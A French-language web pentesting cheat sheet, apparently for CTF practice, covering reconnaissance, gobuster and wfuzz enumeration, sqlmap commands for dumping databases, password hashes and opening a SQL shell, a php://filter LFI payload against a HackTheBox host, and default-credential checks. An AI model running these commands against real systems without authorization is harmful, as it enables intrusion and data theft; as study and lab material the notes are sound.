# 1. WEB

# Reconnaissance
## Action à réaliser 
   1. Générer une feuille de note web
   2. Ajouter l'ip / nom de domaine dans /etc/hosts
   2. Lancer en parralèlle les actions de la rubrique "Scanning"
   3. Regarder tous les liens du site
   4. Noter tous les sous domaines
   5. Ajouter tous les sous domaines à /etc/hosts
   6. Si site https, regarder les infos du certificat, nottament la rubrique Issuer qui peut fournir des infos
   7. Relever tout potentiel nom d'utilisateur
   8. Relever le CMS à l'aide de wappalyzer (lien en resssource)
   9. Relever le langage utilisé à l'aide de wappalyzer (lien en resssource)
   10. Relever les services et versions éventuellements

# Scanning & Enumeration
## Scanning 
### Recherche de Vhost
*Prérequis: Dictionnaires SecList - https://github.com/danielmiessler/SecLists.git*   
<code>
gobuster vhost -u http://@ip_cible -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</code>  
Pour chaque Vhost découvert, les ajouter dans /etc/hosts.

### Recherche de répertoires
<code> 
gobuster dir -u http://@ip_cible/dir -w /usr/share/SecLists/Discovery/Web-Content/raft-small-directories.txt
</code>  

### Recherche de fichiers
<code>
gobuster dir -u http://@ip_cible -w /usr/share/SecLists/Discovery/Web-Content/raft-small-files.txt
</code>  

### Fuzz d'un paramètre
<code>
wfuzz --hh=22 -c -w /usr/share/dirb/wordlists/big.txt http://$target_url/action.php?FUZZ=random
</code>  
Options:  
–hh taille de la réponse (quand il y a une erreur)<br/>
-c (Output with colors)<br/>
-w (Wordlist)<br/>
FUZZ (FUZZ keyword will be replaced by the word from the wordlist)

## Enumeration
### Recherche d'entrées utilisateur
Parcourir le site à la recherche d'élément modifiables par l'utilisateur. Ces éléments peuvent être:
- Champs de saisi utilisateur( formulaire, champs de recherche ...)
- Url
- En tête HTTP

# Exploitation (Gaining Access)
## Recherche de vulnérabilités
Pour chaque entrée utilisateur rechercher les éventuelles vulnérabilités:
### Injection SQL
L'outil SQLmap est fortement recommandé pour rechercher des vulnérabilités SQL.
Voir : [](../../)
### Utilisation
Utilisation de SQLmap en ligne de commandes :
#### Scann et énumération
 ```sql
  sqlmap --url="http://localhost/index.php?page\=user-info.php" --data="username=asdf&password=asdf&user-info-php-submit-button=Login" -p “username” --banner
--url : permet de spécifier la page sur laquelle on souhaite réaliser les tests d'injection
--data : sont les paramètres à tester
--banner : recherche de bannière - Permet de rechercher quel type de base de données est utilisée
-p : permet de spécifier quel paramètre on souhaite tester
--dbs= : permets de spécifier le type de base de données
 ```
Il est également possible d'utiliser une requête comme base:  
- Récupérer  une requête POST avec le parmaètre à cibler.Soit avec burp, soit en utilisant la console développeur.
- Créer un fichier dans lequel on colle la requête.
```sql
sqlmap -r /chemin/fichier_contenant_la_requete -p parametre_a_tester
```
#### Exploitation
Si une injection est fonctionnelle on va pouvoir l'exploiter avec les options suivantes :
```console
--dbs pour spécifier le type de base de données
--tables pour spécifier les noms des tables en base de données
--columns pour spécifier les noms des colonnes des tables
--users pour récupérer les utilisateur
--passwords pour récupérer les hashs de mdp
--current-user
--current-db
--hostname
--dbs énumère les bases de données
```

Pour récupérer l'intégralité de la base de données
```console
--dump-all
```

On peut injecter une requête sql :
```console
--sql-query=
```

Ou générer un shell :
```console
--sql-shell
```

### Cas particulier
#### Blind time based
Les injections de type blind time based, sont extrêment lente. Il n'est donc pas possible de dump les données à cause du temps énorme nécessaire.
Il est dans ce cas recommandé de se concentré uniquement sur les données nécessaires:
- Noms des bases de données.
- Mot de passe d'un utilisateur précis.  
Exemple:
```console
sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --keep-alive --dbms=mysql -
-risk 3 --technique=TB --thread=10 --random-agent --level 3 -D wordpress -T wp_users --
sql-query="select user_pass from wp_users where ID = 1"
```
L'option --hex peut être utilisé pour réduire le temps de recherche



### Ressources:
Utilisation avancée de SQLmap:  
https://connect.ed-diamond.com/MISC/misc-062/utilisation-avancee-de-sqlmap
### Injection XSS

### XSRF
- Classic
- Via XSS (voi OverGraph)  
### Server Side Template Injection

### Local File Inclusion
Permet de charger le contenu de ressource web ou de fichier du système (peu courant). Généralement on va réaliser une redirection au sein d'un paramètre URL pour afficher le code source d'une page. Cependant, cela peut générer des erreurs. Dans ce cas il faut essayer d'extraire le contenu sous forme de chaune de caractère base64.
Exemple avec php :
```php
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

## Portail d'authentification
Les tests à réaliser sur les portails  d'authentifications sont les suivants:
1. Identifiants de base: admin:admin, identifiants par défaut https://github.com/ihebski/DefaultCreds-cheat-sheet 
2. Injection SQL
3. Regex pour le champs mot de passe: *
4. Mot de passe oublié 
5. Recherche de fonction register



# Privilege Escalation
## Analyse de la réponse du serveur lors d'une authentification valide.
Certaines informations utiles sont parfois fournie lors du process d'authentification. 
Il peut être possible de 
1. Modifier les droits qui nous sont octroyés.  
2. Modifier le JWT

## Modification des variables locales
 Dans le navigateur la modification de variables peut donner accès à des ressources cachés, voir à des élévations de privilèges.  
![Modification de variables locales](../../img/Web/modification-variable-interne.png)   
# Command & Control (Persistence/Maintaining Access)
# Clearing Tracks (usually not necessary in CTF’s, but good practice)

# Resources
https://www.wappalyzer.com/apps 

# Note
Ajouter LFI